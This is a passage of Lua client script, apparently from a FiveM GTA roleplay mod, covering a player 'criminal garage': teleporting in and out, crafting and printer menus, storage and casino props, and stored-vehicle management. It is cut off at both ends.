									event = "Pug:Client:OpenCrimGarageChoppingMenu",
								}
							},
						}
						if v.health >= 1000 then
							if cooldownCheck() then
								LaptopMenu[#LaptopMenu+1] = {
									header = Config.LangT["DoDropOff"]..v.car,
									txt = Config.LangT["CurrentlyCooldown"],
									icon = "fas fa-car",
									disabled = true,
									params = {
										isServer = true,
										event = " ",
										args = {
											info = v,
										}
									}
								}
							else
								LaptopMenu[#LaptopMenu+1] = {
									header = Config.LangT["DoDropOff"]..v.car,
									icon = "fas fa-car",
									params = {
										isServer = true,
										event = "Pug:Server:TakeVehicleToDropOff",
										args = {
											info = v,
											Garagecoods = GarageCoods['Zone']['setplayercoords'],
										}
									}
								}
							end
						else
							local cost = round(1000 - v.health)
							local RepairPrice = round(cost * Config.VehicleRepairMultiplier)
							LaptopMenu[#LaptopMenu+1] = {
								header = Config.LangT["Repair"]..v.car.. Config.LangT["ForMoney"].. RepairPrice,
								icon = "fas fa-car",
								params = {
									isServer = true,
									event = "Pug:Server:RepairStoredVehicle",
									args = {
										info = v,
										price = RepairPrice,
									}
								}
							}
						end
						exports[Config.Menu]:openMenu(LaptopMenu)
					end
				end
			end
			Wait(200)
			if not InStolenCar then
				TriggerEvent("Pug:Client:CriminalGarageMenu")
			end
		end
	end
end)

RegisterNetEvent("Pug:Client:EnterCriminalGarage", function(data)
	if data.toggle then
		if Config.Debug then
			print'here1'
		end
		CurrentGarage = data.info
		if Config.Debug then
			print(CurrentGarage.bucketid, 'currentgarage')
		end
		if not GarageCoods then 
			for k, v in pairs(Config.GarageZones) do
				if #(GetEntityCoords(PlayerPedId()) - Config.GarageZones[k]['Zone']['cameracoords']) <= 80.0 then
					GarageCoods = Config.GarageZones[k]
					break
				end
			end
		end
		if Config.Debug then
			print('here2', GarageCoods)
		end
		TriggerServerEvent("Pug:server:CrimGarageToggleBucket", CurrentGarage.bucketid)
		local Ped = PlayerPedId()
		if data.server then
		else
			if IsPedInAnyVehicle(Ped) then
				local Vehicle = GetVehiclePedIsIn(Ped)
				for i = -1, 5,1 do   
					local occupant = GetPedInVehicleSeat(Vehicle, i)
					for _, v in pairs(GetPlayersFromCoords(GetEntityCoords(PlayerPedId()), 5.0)) do
						local dist = #(GetEntityCoords(GetPlayerPed(v)) - GetEntityCoords(PlayerPedId()))     
						if dist <= 5.0 then
							if occupant == GetPlayerPed(v) then
								local Id = GetPlayerServerId(v)
								if Id > 0 then
									if Id == GetPlayerServerId(PlayerId()) then
									else
										TriggerServerEvent("Pug:server:CrimGarageToggleBucketOtherPlayer", CurrentGarage.bucketid, Id, false, CurrentGarage)
									end
								end
							end
						end
					end
				end
			end
		end
		DoScreenFadeOut(500)
		while not IsScreenFadedOut() do Wait(100) end
		if Config.Debug then
			print('here3 Screen faded out')
		end
		if data.server then
		else
			if Config.Debug then
				print('here7 created laptop target')
			end
			TriggerEvent("CreateLaptopBoxZoneEvent")
		end
		if Config.Debug then
			print('here8')
		end
		TriggerEvent("SpawnStoredVehiclesEvent")
		if Config.Debug then
			print('here9')
		end
		if GarageCoods ~= nil and not IsPedInAnyVehicle(PlayerPedId()) then
			if Config.Debug then
				print('here4 exist and no vehicle')
			end
			SetEntityCoords(PlayerPedId(), vector3(GarageCoods['Zone']['setplayercoords'].x,GarageCoods['Zone']['setplayercoords'].y,GarageCoods['Zone']['setplayercoords'].z-1))
			SetEntityHeading(PlayerPedId(), GarageCoods['Zone']['setplayercoords'].w)
			TaskGoStraightToCoord(PlayerPedId(),  GarageCoods['Zone']['cameracoords'], 1.0, -1, 0.0, 0.0)
			Wait(200)
			if Config.DoCameraEffect then
				CreateCamera(vector3(GarageCoods['Zone']['cameracoords'].x,GarageCoods['Zone']['cameracoords'].y,GarageCoods['Zone']['cameracoords'].z+2.0), vector3(-70.0, 0.0, 0.0), true)-- creates camera pos and rotation
				PointCamAtCoord(cam, GetEntityCoords(PlayerPedId()).x, GetEntityCoords(PlayerPedId()).y,GetEntityCoords(PlayerPedId()).z)
				DoScreenFadeIn(500)
				while #(GetEntityCoords(PlayerPedId()) - GarageCoods['Zone']['cameracoords']) >= 1.5 do Wait(100) end
				DoScreenFadeOut(500)
				while not IsScreenFadedOut() do Wait(100) end
				DestoryCamera()
			end
		end
		InsideGarage = true
		if Config.Debug then
			print('here5 started teleport')
		end
		StartPlayerTeleport(PlayerId(), 970.77, -2990.27, -39.35, 185.06, true, true, true)
		while IsPlayerTeleportActive() do Wait(100) end
		if Config.Debug then
			print('here6 finished teleport')
		end
		for k, v in pairs(Config.UpgradesMenu) do
			if CurrentGarage.upgrades ~= nil then
				for _, j in pairs(json.decode(CurrentGarage.upgrades)) do
					if j == v.itemupgrade then
						TriggerEvent(Config.UpgradesMenu[k].AddUpgradeEvent)
						break
					end
				end
			end
		end
		Wait(2500)
		DoScreenFadeIn(500)
	else
		DoScreenFadeOut(500)
		while not IsScreenFadedOut() do Wait(100) end
		if CurrentGarage ~= nil then
			if CurrentGarage.carsstored ~= nil then
				for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
					if k <= CurrentGarage.vehiclecap then
						local coords = Config.CarSpawnLocations[k]
						for _, j in pairs(GetGamePool('CVehicle')) do
							if #(GetEntityCoords(j) - vector3(coords.x,coords.y,coords.z)) <= 4 then
								if GetResourceState("AdvancedParking") == 'started' then
									exports["AdvancedParking"]:DeleteVehicle(j)
								else
									TriggerEvent("FullyDeleteChoppingVehicle", j)
								end
							end
						end
					end
				end
			end
		end
		CleanUpGarage()
		if GarageCoods == nil then
			StartPlayerTeleport(PlayerId(), 951.25, -1548.9, 30.76, 268.24, true, true, true)
		else
			StartPlayerTeleport(PlayerId(), GarageCoods['Zone']['setplayercoords'].x,GarageCoods['Zone']['setplayercoords'].y,GarageCoods['Zone']['setplayercoords'].z-1, GarageCoods['Zone']['setplayercoords'].w-180, true, true, true)
		end
		while IsPlayerTeleportActive() do Wait(100) end
		GarageCoods = nil
		CurrentGarage = nil
		InsideGarage = false
		Wait(800)
		DoScreenFadeIn(500)
		Wait(700)
		TriggerServerEvent("Pug:server:CrimGarageToggleBucket")
		if data.server then
		else
			local Ped = PlayerPedId()
			if IsPedInAnyVehicle(Ped) then
				local Vehicle = GetVehiclePedIsIn(Ped)
				for i = -1, 5,1 do   
					local occupant = GetPedInVehicleSeat(Vehicle, i)
					for _, v in pairs(GetPlayersFromCoords(GetEntityCoords(PlayerPedId()), 5.0)) do
						local dist = #(GetEntityCoords(GetPlayerPed(v)) - GetEntityCoords(PlayerPedId()))     
						if dist <= 5.0 then
							if occupant == GetPlayerPed(v) then
								local Id = GetPlayerServerId(v)
								if Id > 0 then
									if Id == GetPlayerServerId(PlayerId()) then
									else
										TriggerServerEvent("Pug:server:CrimGarageToggleBucketOtherPlayer", false, Id, false, CurrentGarage)
									end
								end
							end
						end
					end
				end
			end
		end
	end
end)


RegisterNetEvent("Pug:client:AddWeldingBench", function()
	if CurrentGarage then
		if Config.Target == "ox_target" then
			CrimGarageWeldBench = exports.ox_target:addBoxZone({
				coords = vector3(995.41, -2987.55, -39.65),
				size = vector3(1, 2, 1),
				rotation = 270,
				debug = Config.Debug,
				options = {
					{
						name= "CrimGarageWeldBench",
						type = "client",
						event = "Pug:client:ChopPartsDown",
						icon = "fas fa-screwdriver",
						label = "Chop Parts Down",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("CrimGarageWeldBench", vector3(995.41, -2987.55, -39.65), 2.8, 1, {
				name="CrimGarageWeldBench",
				heading=270,
				debugPoly = Config.Debug,
				minZ=-40.65,
				maxZ=-39.25,
			}, {
				options = {
					{
						icon = "fas fa-screwdriver",
						label = "Chop Parts Down",
						event = "Pug:client:ChopPartsDown",
					},
				},
				distance = 2.0
			})
		end
	end
end)

RegisterNetEvent("Pug:client:AddCraftingBenchTarget", function()
	if CurrentGarage then
		if Config.Target == "ox_target" then
			CrimGarageCraftingBench = exports.ox_target:addBoxZone({
				coords = vector3(965.36, -2992.93, -39.65),
				size = vector3(1, 2, 1),
				rotation = 0,
				debug = Config.Debug,
				options = {
					{
						name= "CrimGarageCraftingBench",
						type = "client",
						event = "Pug:client:CrimGarageCraftingBench",
						icon = "fas fa-screwdriver",
						label = "Crafting Bench",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("CrimGarageCraftingBench", vector3(965.36, -2992.93, -39.65), 3.4, 1, {
				name="CrimGarageCraftingBench",
				heading=0,
				debugPoly = Config.Debug,
				minZ=-40.65,
				maxZ=-38.45,
			}, {
				options = {
					{
						icon = "fas fa-screwdriver",
						label = "Crafting Bench",
						event = "Pug:client:CrimGarageCraftingBench",
					},
				},
				distance = 2.0
			})
		end
	end
end)

RegisterNetEvent("Pug:client:AddStorageTarget", function()
	if CurrentGarage then
		if Config.Target == "ox_target" then
			CriminalGarageStorage = exports.ox_target:addBoxZone({
				coords = vector3(967.68, -2999.73, -39.65),
				size = vector3(1, 2, 2),
				rotation = 0,
				debug = Config.Debug,
				options = {
					{
						name= "CriminalGarageStorage",
						type = "client",
						event = "Pug:client:OpenCriminalGarageStorage",
						icon = "fas fa-box",
						label = "Open Storage",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("CriminalGarageStorage", vector3(967.68, -2999.73, -39.65), 1.4, 1, {
				name="CriminalGarageStorage",
				heading=0,
				debugPoly = Config.Debug,
				minZ=-40.65,
				maxZ=-38.65,
			}, {
				options = {
					{
						icon = "fas fa-box",
						label = "Open Storage",
						event = "Pug:client:OpenCriminalGarageStorage",
					},
				},
				distance = 2.0
			})
		end
	end
end)

RegisterNetEvent("Pug:client:AddClothesTarget", function()
	if CurrentGarage then
		if Config.Target == "qb_target" then
			AddClothesTarget = exports.qb_target:addBoxZone({
				coords = vector3(958.2, -3005.3, -39.65),
				size = vector3(1, 1, 1),
				rotation = 0,
				debug = Config.Debug,
				options = {
					{
						name= "AddClothesTarget",
						type = "client",
						event = "Pug:client:ChoppingCLothingMenu",
						icon = "fas fa-t-shirt",
						label = "Change Clothes",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("AddClothesTarget", vector3(958.2, -3005.3, -39.64), 1.4, 1, {
				name="AddClothesTarget",
				heading=0,
				debugPoly = Config.Debug,
				minZ=-40.64,
				maxZ=-39.24,
			}, {
				options = {
					{
						icon = "fas fa-t-shirt",
						label = "Change Clothes",
						event = "Pug:client:ChoppingCLothingMenu",
					},
				},
				distance = 2.0
			})
		end
	end
end)

RegisterNetEvent("Pug:client:ChoppingCLothingMenu", function()
	ChoppingNotify(Config.LangT["Wardrobe"], 'success')
	TaskTurnPedToFaceCoord(PlayerPedId(), vector3(963.6, -3005.31, -39.64), 1500)
	Wait(1500)
	TriggerEvent(Config.ClothingMenuEvent)
end)

RegisterNetEvent("Pug:client:AddPrinterMachine", function()
	if CurrentGarage then
		LoadModel("v_res_printer")
        printer = CreateObject(GetHashKey("v_res_printer"),vector3(966.39, -3003.37, -39.88))
        FreezeEntityPosition(printer, true)
		SetEntityHeading(printer, -90.0)
		if Config.Target == "ox_target" then
			AddPrinterMachine = exports.ox_target:addBoxZone({
				coords = vector3(966.49, -3003.2, -39.65),
				size = vector3(1, 1, 1),
				rotation = 0,
				debug = Config.Debug,
				options = {
					{
						name= "AddPrinterMachine",
						type = "client",
						event = "Pug:client:UsePrinterMenu",
						icon = "fa-solid fa-print",
						label = "Use Printer",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("AddPrinterMachine", vector3(966.49, -3003.2, -39.64), 1, 1, {
				name="AddPrinterMachine",
				heading=0,
				debugPoly = Config.Debug,
				minZ=-40.24,
				maxZ=-39.44,
			}, {
				options = {
					{
						icon = "fa-solid fa-print",
						label = "Use Printer",
						event = "Pug:client:UsePrinterMenu",
					},
				},
				distance = 2.0
			})
		end
	end
end)
RegisterNetEvent("Pug:client:CrimGarageCraftingBench", function()
	if CurrentGarage then
		TaskGoStraightToCoord(PlayerPedId(),vector3(966.03, -2992.86, -39.65), 1.0, -1, 0.0, 0.0)
		while #(GetEntityCoords(PlayerPedId()) - vector3(966.03, -2992.86, -39.65)) >= 0.2 do Wait(100) end
		ClearPedTasksImmediately(PlayerPedId())
		TaskTurnPedToFaceCoord(PlayerPedId(), vector3(964.53, -2992.84, -39.65), 1500)
		Wait(700)
		loadAnimDict("mini@repair")
        TaskPlayAnim(PlayerPedId(), "mini@repair", "fixing_a_ped", 2.0, 2.0, 12000, 1, 0, false, false, false)
		local MoneyAmount = PugGetPlayerMoneyCount()
		print(MoneyAmount, "MoneyAmount")
		if Config.Menu == "ox_lib" then
			local LaptopMenu = {
				{
					title = Config.LangT["CraftingBench"],
					description = " ",
					icon = "fa-solid fa-boxes-stacked",
					event = "Pug:criminals:clear",
				}
			}
			for k, v in pairs(Config.CraftingItems) do
				local txttext = {}
				local DisabledMenu = true
				for i, j in pairs(v.materials) do 
					if HasItem(i, j) then
						DisabledMenu = false
					else
						DisabledMenu = true
						break
					end
				end
				if v.price ~= nil then
					local price = v.price
					if MoneyAmount >= v.price then
						if not DisabledMenu then
							DisabledMenu = false
						end
					else
						DisabledMenu = true
					end
					txttext[#txttext+1] = ' $'..price
				end
				if v.racingrep ~= nil then
					local racingrep = v.racingrep
					if Config.FrameworkFunctions.GetPlayer(true, false, true).PlayerData.metadata["racing"] >= v.racingrep then
						if not DisabledMenu then
							DisabledMenu = false
						end
					else
						DisabledMenu = true
					end
					txttext[#txttext+1] = racingrep .." Racing REP"
				end
				for i, j in pairs(v.materials) do
					txttext[#txttext+1] = ' '..j..' '..GetItemsInformation(i)
				end
				print(txttext, "txttext")
				LaptopMenu[#LaptopMenu+1] = {
					title = GetItemsInformation(k),
					icon = "fa-solid fa-wrench",
					description = table.concat(txttext, "\n"),
					disabled = DisabledMenu,
					event = "Pug:Client:CrimGarageCrafting",
					args = k
				}
			end
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Back"],
				event = "Pug:criminals:clear",
			}
			lib.registerContext({
				id = 'CraftingBench',
				title = Config.LangT["CraftingBench"],
				options = LaptopMenu
			})
			lib.showContext('CraftingBench')
		else
			local LaptopMenu = {
				{
					header = Config.LangT["CraftingBench"],
					txt = " ",
					icon = "fa-solid fa-boxes-stacked",
					params = {
						event = "Pug:criminals:clear",
					}
				}
			}
			for k, v in pairs(Config.CraftingItems) do
				local txttext = {}
				local DisabledMenu = true
				for i, j in pairs(v.materials) do 
					if HasItem(i, j) then
						DisabledMenu = false
					else
						DisabledMenu = true
						break
					end
				end
				if v.price ~= nil then
					local price = v.price
					if MoneyAmount >= v.price then
						if not DisabledMenu then
							DisabledMenu = false
						end
					else
						DisabledMenu = true
					end
					txttext[#txttext+1] = ' $'..price
				end
				if v.racingrep ~= nil then
					local racingrep = v.racingrep
					if Config.FrameworkFunctions.GetPlayer(true, false, true).PlayerData.metadata["racing"] >= v.racingrep then
						if not DisabledMenu then
							DisabledMenu = false
						end
					else
						DisabledMenu = true
					end
					txttext[#txttext+1] = racingrep .." Racing REP"
				end
				for i, j in pairs(v.materials) do
					txttext[#txttext+1] = ' '..j..' '..GetItemsInformation(i)
				end
				LaptopMenu[#LaptopMenu+1] = {
					header = GetItemsInformation(k),
					icon = "fa-solid fa-wrench",
					text = txttext,
					disabled = DisabledMenu,
					params = {
						event = "Pug:Client:CrimGarageCrafting",
						args = k
					}
				}
			end
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Back"],
				params = {
					event = "Pug:criminals:clear",
				}
			}
			exports[Config.Menu]:openMenu(LaptopMenu)
		end
	end
end)

RegisterNetEvent("Pug:Client:CrimGarageCrafting", function(item)
	if Config.CraftingItems[item].price ~= nil then
		TriggerServerEvent("Pug:Server:PayForCrafting", Config.CraftingItems[item].price)
	end
	for k, v in pairs(Config.CraftingItems[item].materials) do
		if HasItem(k, v) then
			ChoppingAddItem(false, k, v)
		else
			TriggerServerEvent("Pug:Server:BanPlayerWarehouse")
		end
	end
	TriggerEvent("Pug:client:DisableKeysChopping")
	loadAnimDict("mini@repair")
	TaskPlayAnim(PlayerPedId(), "mini@repair", "fixing_a_ped", 2.0, 2.0, 7500, 1, 0, false, false, false)
	if Config.UseProgressBar then
		if Framework == "ESX" then
			FWork.Progressbar("Crafting ".. GetItemsInformation(item), 7500, {FreezePlayer = true, onFinish = function()
				DisableAllControlActionsBool = false
				if item == "harness" then
					info = {
						uses = 3
					}
					ChoppingAddItem(true, item, 1, info)
				else
					ChoppingAddItem(true, item)
				end
			end, onCancel = function()
				DisableAllControlActionsBool = false
				ChoppingNotify(Config.LangT["Canceled"], 'error')
				for k, v in pairs(Config.CraftingItems[item].materials) do
					ChoppingAddItem(true, k, v)
				end
			end})
		else
			FWork.Functions.Progressbar("Crafting", "Crafting ".. GetItemsInformation(item), 7500, false, true, {
				disableMovement = true,
				disableCarMovement = true,
				disableMouse = false,
				disableCombat = true,
			}, {}, {}, {}, function() -- Done
				DisableAllControlActionsBool = false
				if item == "harness" then
					info = {
						uses = 3
					}
					ChoppingAddItem(true, item, 1, info)
				else
					ChoppingAddItem(true, item)
				end
			end, function()
				DisableAllControlActionsBool = false
				ChoppingNotify(Config.LangT["Canceled"], 'error')
				for k, v in pairs(Config.CraftingItems[item].materials) do
					ChoppingAddItem(true, k, v)
				end
			end)
		end
	else
		Wait(1500)
		ChoppingNotify("Crafting ".. GetItemsInformation(item), 'error')
		Wait(1500)
		ChoppingNotify(Config.LangT["3"], 'error')
		Wait(1500)
		ChoppingNotify(Config.LangT["2"], 'error')
		Wait(1500)
		ChoppingNotify(Config.LangT["1"], 'error')
		Wait(1500)
	end
end)


RegisterNetEvent("Pug:client:UsePrinterMenu", function()
	if CurrentGarage then
		if Config.Menu == "ox_lib" then
			local LaptopMenu = {
				{
					title = Config.LangT["GaragePrinter"],
					description = '',
					icon = "fa-solid fa-clipboard",
					event = " ",
				},
			}
			local txttext = {}
			for k, v in pairs(Config.PrinterOptions) do
				for i, j in pairs(v.Reqired) do
					txttext[#txttext+1] = ' '..j..' '..GetItemsInformation(i)
				end
				LaptopMenu[#LaptopMenu+1] = {
					title = GetItemsInformation(v.Item).. " $".. v.price,
					description = table.concat(txttext, "\n"),
					icon = "fa-solid fa-print",
					event = "Pug:client:UsePrinter",
					args = k
				}
				txttext = {}
			end
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Back"],
				event = " ",
			}
			lib.registerContext({
				id = 'GaragePrinter',
				title = Config.LangT["GaragePrinter"],
				options = LaptopMenu
			})
			lib.showContext('GaragePrinter')
		else
			local LaptopMenu = {
				{
					header = Config.LangT["GaragePrinter"],
					txt = '',
					icon = "fa-solid fa-clipboard",
					params = {
						event = " ",
					}
				},
			}
			local txttext = {}
			for k, v in pairs(Config.PrinterOptions) do
				for i, j in pairs(v.Reqired) do
					txttext[#txttext+1] = ' '..j..' '..GetItemsInformation(i)
				end
				LaptopMenu[#LaptopMenu+1] = {
					header = GetItemsInformation(v.Item).. " $".. v.price,
					txt = txttext,
					icon = "fa-solid fa-print",
					params = {
						event = "Pug:client:UsePrinter",
						args = k
					}
				}
				txttext = {}
			end
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Back"],
				params = {
					event = " ",
				}
			}
			exports[Config.Menu]:openMenu(LaptopMenu)
		end
	end
end)
RegisterNetEvent("Pug:client:UsePrinter", function(slot)
	Config.FrameworkFunctions.TriggerCallback("Pug:ServerCB:CanPrintThisOut", function(CanDo)
		if CanDo then
			TaskGoStraightToCoord(PlayerPedId(),vector3(965.63, -3003.37, -39.64), 1.0, -1, 0.0, 0.0)
			while #(GetEntityCoords(PlayerPedId()) - vector3(965.63, -3003.37, -39.64)) >= 0.2 do Wait(100) end
			ClearPedTasksImmediately(PlayerPedId())
			TaskTurnPedToFaceCoord(PlayerPedId(), vector3(966.88, -3003.38, -39.64), 1500)
			Wait(700)
			loadAnimDict("amb@world_human_leaning@female@wall@back@hand_up@idle_a")
			TaskPlayAnim(PlayerPedId(), "amb@world_human_leaning@female@wall@back@hand_up@idle_a", "idle_a", 2.0, 2.0, 3000, 51, 0, false, false, false)
			if Framework == "ESX" then
				FWork.Progressbar("Printing the "..GetItemsInformation(Config.PrinterOptions[slot].Item), 7000, {FreezePlayer = true, onFinish = function()
					ClearPedTasksImmediately(PlayerPedId())
					TriggerServerEvent("Pug:Server:PayPrinterFees", slot)
				end, onCancel = function()
					ChoppingNotify(Config.LangT["Canceled"], "error")
					ClearPedTasksImmediately(PlayerPedId())
				end})
			else
				FWork.Functions.Progressbar("pickup_sla", "Printing the "..GetItemsInformation(Config.PrinterOptions[slot].Item), 7000, false, true, {
					disableMovement = true,
					disableCarMovement = true,
					disableMouse = false,
					disableCombat = true,
				}, {}, {}, {}, function() -- Done
					ClearPedTasksImmediately(PlayerPedId())
					TriggerServerEvent("Pug:Server:PayPrinterFees", slot)
				end, function()
					ChoppingNotify(Config.LangT["Canceled"], "error")
					ClearPedTasksImmediately(PlayerPedId())
				end)
			end
		end
	end, slot)
end)

RegisterNetEvent("Pug:client:AddArcadeMechine", function()
	if CurrentGarage then
		LoadModel("prop_arcade_01")
        arcademechine = CreateObject(GetHashKey("prop_arcade_01"),vector3(960.0, -2999.7, -40.64))
        FreezeEntityPosition(arcademechine, true)
		SetEntityHeading(arcademechine, 0.0)
		if Config.Target == "ox_target" then
			AddArcadeMechine = exports.ox_target:addBoxZone({
				coords = vector3(960.0, -2999.7, -39.65),
				size = vector3(1, 1, 2),
				rotation = 0,
				debug = Config.Debug,
				options = {
					{
						name= "AddArcadeMechine",
						type = "client",
						event = "Pug:client:ArcadeMachineMenu",
						icon = "fa-solid fa-print",
						label = "Play Games",
						distance = 2.0
					}
				}
			})
		else
			exports[Config.Target]:AddBoxZone("AddArcadeMechine", vector3(960.0, -2999.7, -39.64), 1, 1, {
				name="AddArcadeMechine",
				heading=0,
				debugPoly = Config.Debug,
				minZ=-40.64,
				maxZ=-38.64,
			}, {
				options = {
					{
						icon = "fa-solid fa-print",
						label = "Play Games",
						event = "Pug:client:ArcadeMachineMenu",
					},
				},
				distance = 2.0
			})
		end
	end
end)

RegisterNetEvent("Pug:client:ArcadeMachineMenu", function(info)
	if CurrentGarage then
		if not info or type(info) == "table" then
			TaskGoStraightToCoord(PlayerPedId(), vector3(960.03, -3000.36, -39.64), 1.0, -1, 0.0, 0.0)
			while #(GetEntityCoords(PlayerPedId()) - vector3(960.03, -3000.36, -39.64)) >= 0.2 do Wait(100) end
			ClearPedTasksImmediately(PlayerPedId())
			TaskTurnPedToFaceCoord(PlayerPedId(), vector3(960.05, -2998.87, -39.44), 1500)
			Wait(700)
			loadAnimDict("mp_fbi_heist")
			TaskPlayAnim(PlayerPedId(), "mp_fbi_heist", "loop", 2.0, 2.0, 7000, 16, 0, false, false, false)
		end
		local DontShowMenu = true
		local Header = Config.LangT["Purchase"]..Config.ArcadeGames[1].Game
		local text = '$'..Config.ArcadeGames[1].price .. ' & ' .. Config.ArcadeGames[1].CarsCount .. Config.LangT["CarsObtained"]
		local Game = "Pug:Server:UpgradeArcadeGames"
		if info then
			if type(info) == "table" then
			else
				Header =  Config.LangT["Purchase"]..Config.ArcadeGames[info].Game
				text = '$'..Config.ArcadeGames[info].price .. ' & ' .. Config.ArcadeGames[info].CarsCount .. Config.LangT["CarsObtained"]
			end
		end
		for k, v in pairs(Config.ArcadeGames) do
			if CurrentGarage.arcadegames ~= nil then
				for _, j in pairs(json.decode(CurrentGarage.arcadegames)) do
					if j == v.Game then
						if info then
							if type(info) == "table" then
							else
								if Config.ArcadeGames[info].Game == v.Game then
									Header = Config.LangT["Play"]..Config.ArcadeGames[k].Game
									text = Config.LangT["YouOwnThisGame"]
									Game = Config.ArcadeGames[k].GameEvent
									DontShowMenu = false
									break
								else
									DontShowMenu = true
								end
							end
						elseif Config.ArcadeGames[1].Game == v.Game then
							Header = Config.LangT["Play"]..Config.ArcadeGames[k].Game
							Game = Config.ArcadeGames[k].GameEvent
							DontShowMenu = false
						else
							DontShowMenu = true
						end
					else
						DontShowMenu = true
					end
				end
			end
		end
		if Config.Menu == "ox_lib" then
			if Game == "Pug:Server:UpgradeArcadeGames" then
				DontShowMenu = "Pug:Server:UpgradeArcadeGames"
				Game = nil
			else
				DontShowMenu = nil
			end
			-- serverEvent
			local LaptopMenu = {
				{
					title = Header,
					description = text,
					icon = "fa-solid fa-clipboard",
					serverEvent = DontShowMenu,
					event = Game,
					args = info or 1
				},
			}
			for k, v in pairs(Config.ArcadeGames) do
				LaptopMenu[#LaptopMenu+1] = {
					title = v.Game,
					icon = "fas fa-user-secret",
					event = "Pug:client:ArcadeMachineMenu",
					args = k
				}
			end
			LaptopMenu[#LaptopMenu+1] = {
				title = Config.LangT["Back"],
				event = "Pug:criminals:clear",
			}
			lib.registerContext({
				id = "ArcadeMachineMenu",
				title = Header,
				options = LaptopMenu
			})
			lib.showContext("ArcadeMachineMenu")
		else
			if Game == "Pug:Server:UpgradeArcadeGames" then
				DontShowMenu = true
			else
				DontShowMenu = false
			end
			local LaptopMenu = {
				{
					header = Header,
					txt = text,
					icon = "fa-solid fa-clipboard",
					params = {
						isServer = DontShowMenu,
						event = Game,
						args = info or 1
					}
				},
			}
			for k, v in pairs(Config.ArcadeGames) do
				LaptopMenu[#LaptopMenu+1] = {
					header = v.Game,
					icon = "fas fa-user-secret",
					params = {
						event = "Pug:client:ArcadeMachineMenu",
						args = k
					}
				}
			end
			LaptopMenu[#LaptopMenu+1] = {
				header = Config.LangT["Back"],
				params = {
					event = "Pug:criminals:clear",
				}
			}
			exports[Config.Menu]:openMenu(LaptopMenu)
		end
	end
end)

RegisterNetEvent("Pug:criminals:clear", function()
	ClearPedTasksImmediately(PlayerPedId())
end)

RegisterNetEvent("Pug:client:AddBlackJack", function()
	if CurrentGarage then
		local data = {
			dealerPos = vector3(968.65, -3022.43, -39.65),
			dealerHeading = 90.0,
			tablePos = vector3(967.56, -3022.42, -40.65),
			tableHeading = -90.0,
			distance = 1000.0,
			prop = "vw_prop_casino_blckjack_01b"
		},
		LoadModel("vw_prop_casino_blckjack_01b")
        PokerTable = CreateObject(GetHashKey("vw_prop_casino_blckjack_01b"),data.tablePos)
        FreezeEntityPosition(PokerTable, true)
		SetEntityHeading(PokerTable, data.tableHeading)
		TriggerEvent("Pug:client:AddBlackJackTable", data)
	end
end)

RegisterNetEvent("Pug:client:AddPoolTable", function()
	if CurrentGarage then
		LoadModel("prop_pooltable_02")
        PoolTable = CreateObject(GetHashKey("prop_pooltable_02"),vector3(961.49, -3024.33, -40.65))
        FreezeEntityPosition(PoolTable, true)
		-- PoolSticks
		LoadModel("prop_pool_rack_02")
        PoolSticks = CreateObject(GetHashKey("prop_pool_rack_02"),vector3(957.7, -3015.35, -40.1))
        FreezeEntityPosition(PoolSticks, true)
	end
end)

RegisterNetEvent("Pug:client:AddRouleteTable", function()
	if CurrentGarage then
		if not RouletteTable then
			local data = {
				position = vector3(967.19, -3025.37, -40.65),
				rot = -90.0,
				minBet = 250,
				maxBet = 15000
			},
			LoadModel("vw_prop_casino_roulette_01b")
			local NewRouletteTable = CreateObject(GetHashKey("vw_prop_casino_roulette_01b"),data.position)
			FreezeEntityPosition(NewRouletteTable, true)
			SetEntityHeading(NewRouletteTable, data.rot)
			TriggerEvent("Pug:client:RouletteAddRouletteTable", data)
			if DoesEntityExist(NewRouletteTable) then 
				DeleteEntity(NewRouletteTable)
			end
			RouletteTable = true
		end
	end
end)

RegisterNetEvent("Pug:Client:OpenCrimGarageChoppingMenu", function()
	local CarsCount = 0
	local PuckupCarEvent = "Pug:Criminals:JobStart"
	if CurrentGarage.carsstored ~= nil then
		for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
			CarsCount = CarsCount + 1
		end
	end
	if CarsCount >= CurrentGarage.vehiclecap then
		PuckupCarEvent = "Pug:Client:OpenCrimGarageChoppingMenu"
	end
	if Config.Menu == "ox_lib" then
		local LaptopMenu = {
			{
				title = Config.LangT["ManageAllVehicles"],
				description = CarsCount..Config.LangT["CarsActivelyStored"],
				icon = "fa-solid fa-car",
				event = "Pug:Client:OpenCrimGarageLaptopMenu",
				args = 'yuh',
			},
			{
				title = Config.LangT["PickupACar"].. "("..CarsCount.."/"..CurrentGarage.vehiclecap..")",
				icon = "fas fa-user-secret",
				event = PuckupCarEvent,
			},
		}
		if CurrentGarage.carsstored ~= nil then
			for k, v in pairs(json.decode(CurrentGarage.carsstored)) do
				LaptopMenu[#LaptopMenu+1] = {
					title = Config.LangT["Vehicle:"]..v.car,
					description = Config.LangT["BodyHealth"]..v.health..Config.LangT["Plate:"]..v.plate,
					icon = "fas fa-car",
					event = "Pug:Client:TakeVehicleToDropOffMenu",
					args = v
				}
			end
		end
		LaptopMenu[#LaptopMenu+1] = {
			title = Config.LangT["Back"],
			event = "Pug:Client:OpenCrimGarageLaptopMenu",
			args = 'yuh',
		}
		lib.registerContext({
			id = 'ManageAllVehicles',
			title = Config.LangT["ManageAllVehicles"],
			options = LaptopMenu
		})
		lib.showContext('ManageAllVehicles')
	else
		local LaptopMenu = {
			{
				header = Config.LangT["ManageAllVehicles"],
				txt = CarsCount..Config.LangT["CarsActivelyStored"],
				icon = "fa-solid fa-car",
				params = {
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					args = 'yuh',
				}
			},
			{
				header = Config.LangT["PickupACar"].. "("..CarsCount.."/"..CurrentGarage.vehiclecap..")",
				icon = "fas fa-user-secret",
				params = {
					event = PuckupCarEvent,
				}
			},
		}
		if CurrentGarage.carsstored ~= nil then
			for k, v in pairs(json.decode(CurrentGarage.carsstored)) do
				LaptopMenu[#LaptopMenu+1] = {
